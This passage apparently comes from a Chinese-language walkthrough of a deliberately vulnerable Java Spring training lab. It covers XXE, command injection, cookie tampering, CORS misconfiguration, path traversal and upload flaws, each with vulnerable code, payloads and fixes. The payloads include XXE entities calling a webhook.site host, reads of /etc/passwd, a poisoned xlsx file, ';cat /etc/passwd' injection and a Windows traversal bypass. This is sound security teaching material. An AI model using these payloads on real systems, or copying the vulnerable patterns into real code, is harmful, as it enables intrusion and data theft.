style="text-align:left;">基于事件驱动的解析，适合处理大型 XML 文件</td><td style="text-align:left;">高效，内存占用小</td><td style="text-align:left;">解析复杂 XML 需要手动处理回调</td></tr><tr><td style="text-align:left;">Digester`</td><td style="text-align:left;">基于 SAX，将 XML 映射到 Java 对象（Apache Commons 提供）</td><td style="text-align:left;">需要将 XML 映射为 Java 对象时</td><td style="text-align:left;">简化 XML 与 Java 对象的映射</td><td style="text-align:left;">对大文件不友好，灵活性较低</td></tr><tr><td style="text-align:left;">DocumentBuilder`</td><td style="text-align:left;">Java 中 DOM 解析器，用于构建树状结构</td><td style="text-align:left;">需要完整树结构操作，如修改和多次遍历 XML 文件</td><td style="text-align:left;">完整保留文档结构，易于查找和修改</td><td style="text-align:left;">内存占用较大，处理大文件时性能较差</td></tr><tr><td style="text-align:left;"><code>DocumentHelper</code></td><td style="text-align:left;">Dom4j 提供的辅助类，用于快速创建和操作 XML 文档</td><td style="text-align:left;">需要手动构建和操作 XML 文档时</td><td style="text-align:left;">快速创建和处理 XML 文档，灵活性高</td><td style="text-align:left;">内存占用较大，处理超大文件时性能不佳</td></tr></tbody></table><h4 id="统一漏洞利用payload" tabindex="-1">统一漏洞利用payload <a class="header-anchor" href="#统一漏洞利用payload" aria-label="Permalink to &quot;统一漏洞利用payload&quot;">​</a></h4><div class="language-"><button title="Copy code" class="copy"></button><span class="lang"></span><pre><code>&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;&lt;!DOCTYPE test [&lt;!ENTITY xxe SYSTEM &quot;	http://webhook.site/186f2ce9-cf0c-4eda-ad3f-49c3873814a7&quot;&gt;]&gt;&lt;root&gt;&amp;xxe;&lt;/root&gt;
+
+</code></pre><button class="code-block-unfold-btn"></button></div><figure><img src="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202507281127895.png" alt="image-20250728112724781" loading="lazy" decoding="async"></figure><h4 id="统一修复代码" tabindex="-1">统一修复代码 <a class="header-anchor" href="#统一修复代码" aria-label="Permalink to &quot;统一修复代码&quot;">​</a></h4><div class="language-"><button title="Copy code" class="copy"></button><span class="lang"></span><pre><code>//实例化解析类之后通常会支持着三个配置
+obj.setFeature(&quot;http://apache.org/xml/features/disallow-doctype-decl&quot;, true);
+obj.setFeature(&quot;http://xml.org/sax/features/external-general-entities&quot;, false);
+obj.setFeature(&quot;http://xml.org/sax/features/external-parameter-entities&quot;, false);
+
+</code></pre><button class="code-block-unfold-btn"></button></div><p>禁用了外部实体，限制实体来源。</p><h4 id="_10-xxe-xmlbeam-vuln" tabindex="-1">10./xxe/xmlbeam/vuln <a class="header-anchor" href="#_10-xxe-xmlbeam-vuln" aria-label="Permalink to &quot;10./xxe/xmlbeam/vuln&quot;">​</a></h4><div class="language-"><button title="Copy code" class="copy"></button><span class="lang"></span><pre><code>        @PostMapping(value = &quot;/xmlbeam/vuln&quot;)
+        HttpEntity&lt;String&gt; post(@RequestBody UserPayload user) {
+            try {
+                logger.info(user.toString());
+                return ResponseEntity.ok(String.format(&quot;hello, %s!&quot;, user.getUserName()));
+            }catch (Exception e){
+                e.printStackTrace();
+                return ResponseEntity.ok(&quot;error&quot;);
+            }
+        }
+
+        /**
+         * The projection interface using XPath and JSON Path expression to selectively pick elements from the payload.
+         */
+        @ProjectedPayload
+        public interface UserPayload {
+            @XBRead(&quot;//userName&quot;)
+            String getUserName();
+        }
+
+</code></pre><button class="code-block-unfold-btn"></button></div><p>该代码需要使用固定的标签可以实现回显，我们可以构造payload：</p><div class="language-"><button title="Copy code" class="copy"></button><span class="lang"></span><pre><code>&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;
+&lt;!DOCTYPE foo [  
+    &lt;!ENTITY xxe SYSTEM &quot;file:///etc/passwd&quot;&gt;  
+]&gt;
+&lt;userPayload&gt;
+    &lt;userName&gt;&amp;xxe;&lt;/userName&gt;
+&lt;/userPayload&gt;
+
+</code></pre><button class="code-block-unfold-btn"></button></div><figure><img src="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202507281443153.png" alt="image-20250728144316073" loading="lazy" decoding="async"></figure><h4 id="_11-ooxml-readxlsx" tabindex="-1">11/ooxml/readxlsx <a class="header-anchor" href="#_11-ooxml-readxlsx" aria-label="Permalink to &quot;11/ooxml/readxlsx&quot;">​</a></h4><div class="language-"><button title="Copy code" class="copy"></button><span class="lang"></span><pre><code> @PostMapping(&quot;/readxlsx&quot;)
+    @ResponseBody
+    public String ooxml_xxe(MultipartFile file) throws IOException {
+        XSSFWorkbook wb = new XSSFWorkbook(file.getInputStream()); // xxe vuln
+
+        XSSFSheet sheet = wb.getSheetAt(0);
+        XSSFRow row;
+        XSSFCell cell;
+
+        Iterator rows = sheet.rowIterator();
+        StringBuilder sbResult = new StringBuilder();
+
+        while (rows.hasNext()) {
+
+            row = (XSSFRow) rows.next();
+            Iterator cells = row.cellIterator();
+
+            while (cells.hasNext()) {
+                cell = (XSSFCell) cells.next();
+
+                if (cell.getCellType() == XSSFCell.CELL_TYPE_STRING) {
+                    sbResult.append(cell.getStringCellValue()).append(&quot; &quot;);
+                } else if (cell.getCellType() == XSSFCell.CELL_TYPE_NUMERIC) {
+                    sbResult.append(cell.getNumericCellValue()).append(&quot; &quot;);
+                } else {
+                    logger.info(&quot;errors&quot;);
+                }
+            }
+        }
+
+        return sbResult.toString();
+    }
+
+</code></pre><button class="code-block-unfold-btn"></button></div><p>查看源码得知使用的是poi-ooxml组件（ Apache POI是提供Microsoft Office系列文档读、写功能的 JAVA 类库）进行xlsx文件操作，在3.10版本及以下存在XXE注入漏洞，3.15以下版本存在Dos漏洞，这里使用的是3.9版本。</p><figure><img src="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202507281145386.png" alt="image-20250728114555336" loading="lazy" decoding="async"></figure><p>我们新建一个1.xlsx，用7-zip打开这个文件的压缩包</p><figure><img src="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202507281417899.png" alt="image-20250728141719633" loading="lazy" decoding="async"></figure><p>然后修改[Content_Types].xml文件，在最上面添加</p><div class="language-"><button title="Copy code" class="copy"></button><span class="lang"></span><pre><code>&lt;!DOCTYPE test [
+    &lt;!ELEMENT foo ANY&gt;
+    &lt;!ENTITY xxe SYSTEM &quot;	http://webhook.site/186f2ce9-cf0c-4eda-ad3f-49c3873814a7&quot;&gt;
+]&gt;
+&lt;test&gt;&amp;xxe;&lt;/test&gt;
+</code></pre><button class="code-block-unfold-btn"></button></div><p>在upload路由下上传这个1.xlsx，我们在webhook能发现这个文件执行成功了</p><figure><img src="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202507281418084.png" alt="image-20250728141829969" loading="lazy" decoding="async"></figure><h4 id="_12-xlsx-streamer-readxlsx" tabindex="-1">12./xlsx-streamer/readxlsx <a class="header-anchor" href="#_12-xlsx-streamer-readxlsx" aria-label="Permalink to &quot;12./xlsx-streamer/readxlsx&quot;">​</a></h4><div class="language-"><button title="Copy code" class="copy"></button><span class="lang"></span><pre><code> @PostMapping(&quot;/readxlsx&quot;)
+    public void xllx_streamer_xxe(MultipartFile file) throws IOException {
+        StreamingReader.builder().open(file.getInputStream());
+    }
+
+</code></pre><button class="code-block-unfold-btn"></button></div><p>和上题相比就是换了个库的区别，payload一样的</p><h3 id="commandinject" tabindex="-1">Commandinject <a class="header-anchor" href="#commandinject" aria-label="Permalink to &quot;Commandinject&quot;">​</a></h3><h4 id="_1-codeinject" tabindex="-1">1./codeinject <a class="header-anchor" href="#_1-codeinject" aria-label="Permalink to &quot;1./codeinject&quot;">​</a></h4><div class="language-java"><button title="Copy code" class="copy"></button><span class="lang">java</span><pre><code class="language-java">    @GetMapping(&quot;/codeinject&quot;)
+    public String codeInject(String filepath) throws IOException {
+
+        String[] cmdList = new String[]{&quot;sh&quot;, &quot;-c&quot;, &quot;ls -la &quot; + filepath};
+        ProcessBuilder builder = new ProcessBuilder(cmdList);
+        builder.redirectErrorStream(true);
+        Process process = builder.start();
+        return WebUtils.convertStreamToString(process.getInputStream());
+    }
+
+</code></pre><button class="code-block-unfold-btn"></button></div><p>将传入的参数直接与原命令拼接，实现命令注入</p><div class="language-"><button title="Copy code" class="copy"></button><span class="lang"></span><pre><code>?filepath=;cat /etc/passwd
+</code></pre><button class="code-block-unfold-btn"></button></div><figure><img src="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202507281439849.png" alt="image-20250728143906716" loading="lazy" decoding="async"></figure><h4 id="_2-codeinject-host" tabindex="-1">2./codeinject/host <a class="header-anchor" href="#_2-codeinject-host" aria-label="Permalink to &quot;2./codeinject/host&quot;">​</a></h4><div class="language-"><button title="Copy code" class="copy"></button><span class="lang"></span><pre><code>@GetMapping(&quot;/codeinject/host&quot;)
+    public String codeInjectHost(HttpServletRequest request) throws IOException {
+
+        String host = request.getHeader(&quot;host&quot;);
+        logger.info(host);
+        String[] cmdList = new String[]{&quot;sh&quot;, &quot;-c&quot;, &quot;curl &quot; + host};
+        ProcessBuilder builder = new ProcessBuilder(cmdList);
+        builder.redirectErrorStream(true);
+        Process process = builder.start();
+        return WebUtils.convertStreamToString(process.getInputStream());
+    }
+
+</code></pre><button class="code-block-unfold-btn"></button></div><p>同样可以使用命令拼接，但需要再host字段处进行传参（不知道为啥我传不上去，用大佬的图片代替一下）</p><figure><img src="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202507281459171.png" alt="image-20250728145951030" loading="lazy" decoding="async"></figure><h4 id="漏洞修复" tabindex="-1">漏洞修复 <a class="header-anchor" href="#漏洞修复" aria-label="Permalink to &quot;漏洞修复&quot;">​</a></h4><p>修复代码</p><div class="language-"><button title="Copy code" class="copy"></button><span class="lang"></span><pre><code>    @GetMapping(&quot;/codeinject/sec&quot;)
+    public String codeInjectSec(String filepath) throws IOException {
+        String filterFilePath = SecurityUtil.cmdFilter(filepath);
+        if (null == filterFilePath) {
+            return &quot;Bad boy. I got u.&quot;;
+        }
+        String[] cmdList = new String[]{&quot;sh&quot;, &quot;-c&quot;, &quot;ls -la &quot; + filterFilePath};
+        ProcessBuilder builder = new ProcessBuilder(cmdList);
+        builder.redirectErrorStream(true);
+        Process process = builder.start();
+        return WebUtils.convertStreamToString(process.getInputStream());
+    }
+</code></pre><button class="code-block-unfold-btn"></button></div><p>cmdFilter函数代码：</p><div class="language-"><button title="Copy code" class="copy"></button><span class="lang"></span><pre><code>private static final Pattern FILTER_PATTERN = Pattern.compile(&quot;^[a-zA-Z0-9_/\\.-]+<div id="app"></div>quot;);
+   public static String cmdFilter(String input) {
+        if (!FILTER_PATTERN.matcher(input).matches()) {
+            return null;
+        }
+
+        return input;
+    }
+</code></pre><button class="code-block-unfold-btn"></button></div><p>限制了参数中的字符，防止命令注入。</p><h3 id="cookie伪造" tabindex="-1">Cookie伪造 <a class="header-anchor" href="#cookie伪造" aria-label="Permalink to &quot;Cookie伪造&quot;">​</a></h3><h4 id="_1-cookie-vuln01" tabindex="-1">1./cookie/vuln01 <a class="header-anchor" href="#_1-cookie-vuln01" aria-label="Permalink to &quot;1./cookie/vuln01&quot;">​</a></h4><div class="language-"><button title="Copy code" class="copy"></button><span class="lang"></span><pre><code>    private static String NICK = &quot;nick&quot;;
+
+    @GetMapping(value = &quot;/vuln01&quot;)
+    public String vuln01(HttpServletRequest req) {
+        String nick = WebUtils.getCookieValueByName(req, NICK); // key code
+        return &quot;Cookie nick: &quot; + nick;
+    }
+</code></pre><button class="code-block-unfold-btn"></button></div><h4 id="_2-cookie-vuln02" tabindex="-1">2./cookie/vuln02 <a class="header-anchor" href="#_2-cookie-vuln02" aria-label="Permalink to &quot;2./cookie/vuln02&quot;">​</a></h4><div class="language-"><button title="Copy code" class="copy"></button><span class="lang"></span><pre><code> @GetMapping(value = &quot;/vuln02&quot;)
+    public String vuln02(HttpServletRequest req) {
+        String nick = null;
+        Cookie[] cookie = req.getCookies();
+
+        if (cookie != null) {
+            nick = getCookie(req, NICK).getValue();  // key code
+        }
+
+        return &quot;Cookie nick: &quot; + nick;
+    }
+
+</code></pre><button class="code-block-unfold-btn"></button></div><h4 id="_3-cookie-vuln03" tabindex="-1">3./cookie/vuln03 <a class="header-anchor" href="#_3-cookie-vuln03" aria-label="Permalink to &quot;3./cookie/vuln03&quot;">​</a></h4><div class="language-"><button title="Copy code" class="copy"></button><span class="lang"></span><pre><code>   @GetMapping(value = &quot;/vuln03&quot;)
+    public String vuln03(HttpServletRequest req) {
+        String nick = null;
+        Cookie cookies[] = req.getCookies();
+        if (cookies != null) {
+            for (Cookie cookie : cookies) {
+                // key code. Equals can also be equalsIgnoreCase.
+                if (NICK.equals(cookie.getName())) {
+                    nick = cookie.getValue();
+                }
+            }
+        }
+        return &quot;Cookie nick: &quot; + nick;
+    }
+Java复制代码1234567891011121314
+</code></pre><button class="code-block-unfold-btn"></button></div><h4 id="_4-cookie-vuln04" tabindex="-1">4./cookie/vuln04 <a class="header-anchor" href="#_4-cookie-vuln04" aria-label="Permalink to &quot;4./cookie/vuln04&quot;">​</a></h4><div class="language-"><button title="Copy code" class="copy"></button><span class="lang"></span><pre><code>@GetMapping(value = &quot;/vuln04&quot;)
+    public String vuln04(HttpServletRequest req) {
+        String nick = null;
+        Cookie cookies[] = req.getCookies();
+        if (cookies != null) {
+            for (Cookie cookie : cookies) {
+                if (cookie.getName().equalsIgnoreCase(NICK)) {  // key code
+                    nick = cookie.getValue();
+                }
+            }
+        }
+        return &quot;Cookie nick: &quot; + nick;
+    }
+
+</code></pre><button class="code-block-unfold-btn"></button></div><h4 id="_5-cookie-vuln05" tabindex="-1">5./cookie/vuln05 <a class="header-anchor" href="#_5-cookie-vuln05" aria-label="Permalink to &quot;5./cookie/vuln05&quot;">​</a></h4><div class="language-"><button title="Copy code" class="copy"></button><span class="lang"></span><pre><code>   @GetMapping(value = &quot;/vuln05&quot;)
+    public String vuln05(@CookieValue(&quot;nick&quot;) String nick) {
+        return &quot;Cookie nick: &quot; + nick;
+    }
+</code></pre><button class="code-block-unfold-btn"></button></div><h4 id="_6-cookie-vuln06" tabindex="-1">6./cookie/vuln06 <a class="header-anchor" href="#_6-cookie-vuln06" aria-label="Permalink to &quot;6./cookie/vuln06&quot;">​</a></h4><div class="language-"><button title="Copy code" class="copy"></button><span class="lang"></span><pre><code>@GetMapping(value = &quot;/vuln06&quot;)
+    public String vuln06(@CookieValue(value = &quot;nick&quot;) String nick) {
+        return &quot;Cookie nick: &quot; + nick;
+    }
+</code></pre><button class="code-block-unfold-btn"></button></div><h4 id="漏洞利用" tabindex="-1">漏洞利用. <a class="header-anchor" href="#漏洞利用" aria-label="Permalink to &quot;漏洞利用.&quot;">​</a></h4><p>我们可以直接通过修改cookie的值实现对nick值的修改，某些情况可能会存在越权漏洞，操作如下：</p><figure><img src="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202507291046226.png" alt="image-20250729104624089" loading="lazy" decoding="async"></figure><h3 id="cors" tabindex="-1">CORS <a class="header-anchor" href="#cors" aria-label="Permalink to &quot;CORS&quot;">​</a></h3><h4 id="原理" tabindex="-1">原理 <a class="header-anchor" href="#原理" aria-label="Permalink to &quot;原理&quot;">​</a></h4><p><strong>跨源资源共享</strong>（CORS，全称为 Cross-Origin Resource Sharing）是一种基于 HTTP 头的机制，允许服务器标示除了它自己以外的其他源（域、协议或端口），使得浏览器允许这些源访问加载自己的资源。CORS 机制通过一种机制来检查服务器是否会允许要发送的真实请求，该机制通过浏览器发起一个到服务器托管的跨源资源的“预检”请求。</p><p>比如说：有两个域a1.com和b1.com，假设b1.com上面有个接口能够获取一些返回的数据，那么如果我们从a1.com写一段js去请求这个接口的数据，一般来说是请求不了的，会在浏览器爆出CORS错误，但如果有CORS设置，就可以实现这样的访问，甚至可以能够使用b1.com上的cookie。</p><h4 id="_1-cors-vuln-origin" tabindex="-1">1./cors/vuln/origin <a class="header-anchor" href="#_1-cors-vuln-origin" aria-label="Permalink to &quot;1./cors/vuln/origin&quot;">​</a></h4><pre><code>private static String info = &quot;{\&quot;name\&quot;: \&quot;JoyChou\&quot;, \&quot;phone\&quot;: \&quot;18200001111\&quot;}&quot;;
+
+@GetMapping(&quot;/vuln/origin&quot;)
+public String vuls1(HttpServletRequest request, HttpServletResponse response) {
+    String origin = request.getHeader(&quot;origin&quot;);
+    response.setHeader(&quot;Access-Control-Allow-Origin&quot;, origin); // set origin from header
+    response.setHeader(&quot;Access-Control-Allow-Credentials&quot;, &quot;true&quot;);  // allow cookie
+    return info;
+}
+</code></pre><h4 id="_2-cors-vuln-setheader" tabindex="-1">2./cors/vuln/setHeader <a class="header-anchor" href="#_2-cors-vuln-setheader" aria-label="Permalink to &quot;2./cors/vuln/setHeader&quot;">​</a></h4><div class="language-"><button title="Copy code" class="copy"></button><span class="lang"></span><pre><code>@GetMapping(&quot;/vuln/setHeader&quot;)
+    public String vuls2(HttpServletResponse response) {
+        // 后端设置Access-Control-Allow-Origin为*的情况下，跨域的时候前端如果设置withCredentials为true会异常
+        response.setHeader(&quot;Access-Control-Allow-Origin&quot;, &quot;*&quot;);
+        return info;
+    }
+
+</code></pre><button class="code-block-unfold-btn"></button></div><h4 id="_3-cors-vuln-crossorigin" tabindex="-1">3./cors/vuln/crossOrigin <a class="header-anchor" href="#_3-cors-vuln-crossorigin" aria-label="Permalink to &quot;3./cors/vuln/crossOrigin&quot;">​</a></h4><div class="language-"><button title="Copy code" class="copy"></button><span class="lang"></span><pre><code>    @GetMapping(&quot;*&quot;)
+    @RequestMapping(&quot;/vuln/crossOrigin&quot;)
+    public String vuls3() {
+        return info;
+    }
+
+</code></pre><button class="code-block-unfold-btn"></button></div><h4 id="漏洞验证" tabindex="-1">漏洞验证 <a class="header-anchor" href="#漏洞验证" aria-label="Permalink to &quot;漏洞验证&quot;">​</a></h4><p>我们可以通过修改origin字段来验证漏洞</p><figure><img src="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202507291407579.png" alt="image-20250729140718474" loading="lazy" decoding="async"></figure><h4 id="漏洞防御" tabindex="-1">漏洞防御 <a class="header-anchor" href="#漏洞防御" aria-label="Permalink to &quot;漏洞防御&quot;">​</a></h4><h5 id="_1-限制origin" tabindex="-1">（1）限制origin <a class="header-anchor" href="#_1-限制origin" aria-label="Permalink to &quot;（1）限制origin&quot;">​</a></h5><div class="language-"><button title="Copy code" class="copy"></button><span class="lang"></span><pre><code>  @CrossOrigin(origins = {&quot;joychou.org&quot;, &quot;http://test.joychou.me&quot;})
+    @GetMapping(&quot;/sec/crossOrigin&quot;)
+    public String secCrossOrigin() {
+        return info;
+    }
+
+</code></pre><button class="code-block-unfold-btn"></button></div><h5 id="_2-webmvcconfigurer设置cors" tabindex="-1">（2）WebMvcConfigurer设置Cors <a class="header-anchor" href="#_2-webmvcconfigurer设置cors" aria-label="Permalink to &quot;（2）WebMvcConfigurer设置Cors&quot;">​</a></h5><div class="language-"><button title="Copy code" class="copy"></button><span class="lang"></span><pre><code>  @GetMapping(&quot;/sec/webMvcConfigurer&quot;)
+    public CsrfToken getCsrfToken_01(CsrfToken token) {
+        return token;
+    }
+
+</code></pre><button class="code-block-unfold-btn"></button></div><p>对应的过滤器</p><div class="language-"><button title="Copy code" class="copy"></button><span class="lang"></span><pre><code>    public WebMvcConfigurer corsConfigurer() {
+        return new WebMvcConfigurerAdapter() {
+            @Override
+            public void addCorsMappings(CorsRegistry registry) {
+                // 为了支持一级域名，重写了checkOrigin
+                //String[] allowOrigins = {&quot;joychou.org&quot;, &quot;http://test.joychou.me&quot;};
+                registry.addMapping(&quot;/cors/sec/webMvcConfigurer&quot;) // /**表示所有路由path
+                        //.allowedOrigins(allowOrigins)
+                        .allowedMethods(&quot;GET&quot;, &quot;POST&quot;)
+                        .allowCredentials(true);
+            }
+        };
+    }
+
+</code></pre><button class="code-block-unfold-btn"></button></div><h5 id="_3-spring-security设置cors" tabindex="-1">（3）spring security设置cors <a class="header-anchor" href="#_3-spring-security设置cors" aria-label="Permalink to &quot;（3）spring security设置cors&quot;">​</a></h5><div class="language-"><button title="Copy code" class="copy"></button><span class="lang"></span><pre><code>@GetMapping(&quot;/sec/httpCors&quot;)
+public CsrfToken getCsrfToken_02(CsrfToken token) {
+    return token;
+}
+
+</code></pre><button class="code-block-unfold-btn"></button></div><p>对应过滤器：</p><div class="language-"><button title="Copy code" class="copy"></button><span class="lang"></span><pre><code>    CorsConfigurationSource corsConfigurationSource()
+    {
+        // Set cors origin white list
+        ArrayList&lt;String&gt; allowOrigins = new ArrayList&lt;&gt;();
+        allowOrigins.add(&quot;joychou.org&quot;);
+        allowOrigins.add(&quot;https://test.joychou.me&quot;); // 区分http和https，并且默认不会拦截同域请求。
+
+        CorsConfiguration configuration = new CorsConfiguration();
+        configuration.setAllowedOrigins(allowOrigins);
+        configuration.setAllowCredentials(true);
+        configuration.setAllowedMethods(Arrays.asList(&quot;GET&quot;, &quot;POST&quot;));
+        UrlBasedCorsConfigurationSource source = new UrlBasedCorsConfigurationSource();
+        source.registerCorsConfiguration(&quot;/cors/sec/httpCors&quot;, configuration); // ant style
+        return source;
+    }
+
+</code></pre><button class="code-block-unfold-btn"></button></div><h5 id="_4-自定义filter设置cors" tabindex="-1">（4）自定义filter设置cors <a class="header-anchor" href="#_4-自定义filter设置cors" aria-label="Permalink to &quot;（4）自定义filter设置cors&quot;">​</a></h5><p>防御代码：</p><div class="language-"><button title="Copy code" class="copy"></button><span class="lang"></span><pre><code>    @GetMapping(&quot;/sec/originFilter&quot;)
+    public CsrfToken getCsrfToken_03(CsrfToken token) {
+        return token;
+    }
+</code></pre><button class="code-block-unfold-btn"></button></div><p>对应过滤器：</p><div class="language-"><button title="Copy code" class="copy"></button><span class="lang"></span><pre><code>@WebFilter(filterName = &quot;OriginFilter&quot;, urlPatterns = &quot;/cors/sec/originFilter&quot;)
+public class OriginFilter implements Filter {
+
+    @Override
+    public void init(FilterConfig filterConfig) throws ServletException {
+
+    }
+
+    private final Logger logger = LoggerFactory.getLogger(this.getClass());
+
+    @Override
+    public void doFilter(ServletRequest req, ServletResponse res, FilterChain filterChain)
+            throws IOException, ServletException {
+
+        HttpServletRequest request = (HttpServletRequest) req;
+        HttpServletResponse response = (HttpServletResponse) res;
+
+        String origin = request.getHeader(&quot;Origin&quot;);
+        logger.info(&quot;[+] Origin: &quot; + origin + &quot;\tCurrent url:&quot; + request.getRequestURL());
+
+        // 以file协议访问html，origin为字符串的null，所以依然会走安全check逻辑
+        if (origin != null &amp;&amp; SecurityUtil.checkURL(origin) == null) {
+            logger.error(&quot;[-] Origin check error. &quot; + &quot;Origin: &quot; + origin +
+                    &quot;\tCurrent url:&quot; + request.getRequestURL());
+            response.setStatus(response.SC_FORBIDDEN);
+            response.getWriter().println(&quot;Invaid cors config by joychou.&quot;);
+            return;
+        }
+
+        response.setHeader(&quot;Access-Control-Allow-Origin&quot;, origin);
+        response.setHeader(&quot;Access-Control-Allow-Credentials&quot;, &quot;true&quot;);
+        response.setHeader(&quot;Access-Control-Allow-Methods&quot;, &quot;GET, POST, OPTION&quot;);
+
+        filterChain.doFilter(req, res);
+    }
+</code></pre><button class="code-block-unfold-btn"></button></div><h5 id="_5-corsfilter设置cors" tabindex="-1">（5）CorsFilter设置cors <a class="header-anchor" href="#_5-corsfilter设置cors" aria-label="Permalink to &quot;（5）CorsFilter设置cors&quot;">​</a></h5><p>防御代码：</p><div class="language-"><button title="Copy code" class="copy"></button><span class="lang"></span><pre><code> @RequestMapping(&quot;/sec/corsFilter&quot;)
+    public CsrfToken getCsrfToken_04(CsrfToken token) {
+        return token;
+    }
+</code></pre><button class="code-block-unfold-btn"></button></div><p>对应过滤器：</p><div class="language-"><button title="Copy code" class="copy"></button><span class="lang"></span><pre><code>public class BaseCorsFilter extends CorsFilter {
+
+    public BaseCorsFilter() {
+        super(configurationSource());
+    }
+
+    private static UrlBasedCorsConfigurationSource configurationSource() {
+        CorsConfiguration config = new CorsConfiguration();
+        config.setAllowCredentials(true);
+        config.addAllowedOrigin(&quot;joychou.org&quot;); // 不支持
+        config.addAllowedOrigin(&quot;http://test.joychou.me&quot;);
+        config.addAllowedHeader(&quot;*&quot;);
+        config.addAllowedMethod(&quot;GET&quot;);
+        config.addAllowedMethod(&quot;POST&quot;);
+
+        UrlBasedCorsConfigurationSource source = new UrlBasedCorsConfigurationSource();
+        source.registerCorsConfiguration(&quot;/cors/sec/corsFilter&quot;, config);
+
+        return source;
+    }
+}
+</code></pre><button class="code-block-unfold-btn"></button></div><h5 id="_6-origin检查" tabindex="-1">（6）origin检查 <a class="header-anchor" href="#_6-origin检查" aria-label="Permalink to &quot;（6）origin检查&quot;">​</a></h5><p>防御代码：</p><div class="language-"><button title="Copy code" class="copy"></button><span class="lang"></span><pre><code>    @GetMapping(&quot;/sec/checkOrigin&quot;)
+    public String seccode(HttpServletRequest request, HttpServletResponse response) {
+        String origin = request.getHeader(&quot;Origin&quot;);
+
+        // 如果origin不为空并且origin不在白名单内，认定为不安全。
+        // 如果origin为空，表示是同域过来的请求或者浏览器直接发起的请求。
+        if (origin != null &amp;&amp; SecurityUtil.checkURL(origin) == null) {
+            return &quot;Origin is not safe.&quot;;
+        }
+        response.setHeader(&quot;Access-Control-Allow-Origin&quot;, origin);
+        response.setHeader(&quot;Access-Control-Allow-Credentials&quot;, &quot;true&quot;);
+        return LoginUtils.getUserInfo2JsonStr(request);
+    }
+</code></pre><button class="code-block-unfold-btn"></button></div><h3 id="目录遍历" tabindex="-1">目录遍历 <a class="header-anchor" href="#目录遍历" aria-label="Permalink to &quot;目录遍历&quot;">​</a></h3><h4 id="_1-path-traversal-vul" tabindex="-1">1./path_traversal/vul <a class="header-anchor" href="#_1-path-traversal-vul" aria-label="Permalink to &quot;1./path_traversal/vul&quot;">​</a></h4><p>漏洞代码：</p><div class="language-"><button title="Copy code" class="copy"></button><span class="lang"></span><pre><code>  @GetMapping(&quot;/path_traversal/vul&quot;)
+    public String getImage(String filepath) throws IOException {
+        return getImgBase64(filepath);
+    }
+private String getImgBase64(String imgFile) throws IOException {
+
+        logger.info(&quot;Working directory: &quot; + System.getProperty(&quot;user.dir&quot;));
+        logger.info(&quot;File path: &quot; + imgFile);
+
+        File f = new File(imgFile);
+        if (f.exists() &amp;&amp; !f.isDirectory()) {
+            byte[] data = Files.readAllBytes(Paths.get(imgFile));
+            return new String(Base64.encodeBase64(data));
+        } else {
+            return &quot;File doesn&#39;t exist or is not a file.&quot;;
+        }
+    }
+</code></pre><button class="code-block-unfold-btn"></button></div><p>存在目录穿越，我们直接读取文件</p><figure><img src="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202507301105109.png" alt="image-20250730110528049" loading="lazy" decoding="async"></figure><p>修复代码：</p><div class="language-"><button title="Copy code" class="copy"></button><span class="lang"></span><pre><code>    @GetMapping(&quot;/path_traversal/sec&quot;)
+    public String getImageSec(String filepath) throws IOException {
+        if (SecurityUtil.pathFilter(filepath) == null) {
+            logger.info(&quot;Illegal file path: &quot; + filepath);
+            return &quot;Bad boy. Illegal file path.&quot;;
+        }
+        return getImgBase64(filepath);
+    }
+</code></pre><button class="code-block-unfold-btn"></button></div><p>pathFilter函数内容：</p><div class="language-"><button title="Copy code" class="copy"></button><span class="lang"></span><pre><code> public static String pathFilter(String filepath) {
+        String temp = filepath;
+
+        // use while to sovle multi urlencode
+        while (temp.indexOf(&#39;%&#39;) != -1) {
+            try {
+                temp = URLDecoder.decode(temp, &quot;utf-8&quot;);
+            } catch (UnsupportedEncodingException e) {
+                logger.info(&quot;Unsupported encoding exception: &quot; + filepath);
+                return null;
+            } catch (Exception e) {
+                logger.info(e.toString());
+                return null;
+            }
+        }
+
+        if (temp.contains(&quot;..&quot;) || temp.charAt(0) == &#39;/&#39;) {
+            return null;
+        }
+
+        return filepath;
+    }
+</code></pre><button class="code-block-unfold-btn"></button></div><p>对文件路径参数增加了过滤方法pathFilter，如果文件路径开头为/字符或者存在…连续字符出现就返回空字符串，但是这种过滤只是简单的应对措施，如果是Windows操作系统上以盘符开始的路径，就显得无能为力。例如使用\读取（windows下）</p><div class="language-"><button title="Copy code" class="copy"></button><span class="lang"></span><pre><code>/path_traversal/sec?filepath=..\..\..\..\..\windows\win.ini
+</code></pre><button class="code-block-unfold-btn"></button></div><h3 id="文件上传" tabindex="-1">文件上传 <a class="header-anchor" href="#文件上传" aria-label="Permalink to &quot;文件上传&quot;">​</a></h3><h4 id="_1-file-upload" tabindex="-1">1./file/upload <a class="header-anchor" href="#_1-file-upload" aria-label="Permalink to &quot;1./file/upload&quot;">​</a></h4><div class="language-"><button title="Copy code" class="copy"></button><span class="lang"></span><pre><code>    @PostMapping(&quot;/upload&quot;)
+    public String singleFileUpload(@RequestParam(&quot;file&quot;) MultipartFile file,
+                                   RedirectAttributes redirectAttributes) {
+        if (file.isEmpty()) {
+            // 赋值给uploadStatus.html里的动态参数message
+            redirectAttributes.addFlashAttribute(&quot;message&quot;, &quot;Please select a file to upload&quot;);
+            return &quot;redirect:/file/status&quot;;
+        }
+
+        try {
+            // Get the file and save it somewhere
+            byte[] bytes = file.getBytes();
+            Path path = Paths.get(UPLOADED_FOLDER + file.getOriginalFilename());
+            Files.write(path, bytes);
+
+            redirectAttributes.addFlashAttribute(&quot;message&quot;,
+                    &quot;You successfully uploaded &#39;&quot; + UPLOADED_FOLDER + file.getOriginalFilename() + &quot;&#39;&quot;);
+
+        } catch (IOException e) {
+            redirectAttributes.addFlashAttribute(&quot;message&quot;, &quot;upload failed&quot;);
+            logger.error(e.toString());
+        }
+
+        return &quot;redirect:/file/status&quot;;
+    }
+
